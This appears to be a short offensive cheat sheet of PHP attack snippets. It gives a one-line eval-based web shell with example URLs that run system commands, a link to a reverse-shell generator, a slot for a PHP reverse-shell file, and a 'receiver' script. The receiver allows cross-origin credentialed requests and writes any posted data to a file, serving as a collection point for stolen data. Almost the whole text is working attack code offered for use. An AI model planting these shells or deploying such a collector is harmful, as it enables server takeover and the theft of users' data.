# php file

---
## web-shell

*x.php5*
```php
<?php @eval($_GET['x']);
```
*url command*
```bash
/x.php5?x=phpinfo();
```
```bash
/x.php5?x=system("whoami");
```
[reverse shell](https://www.revshells.com/)

---

## php-reverse-shell

<<< ./php/php-reverse-shell.php


---

## receiver

`sudo apt install php apache2` go to `/var/www/html/`

This script captures the data from `php://input` and then saves the data in a text file. 

```php
<?php
header("Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}");
header('Access-Control-Allow-Credentials: true');

$postdata = file_get_contents("php://input");

file_put_contents('data.txt', $postdata);
?>
```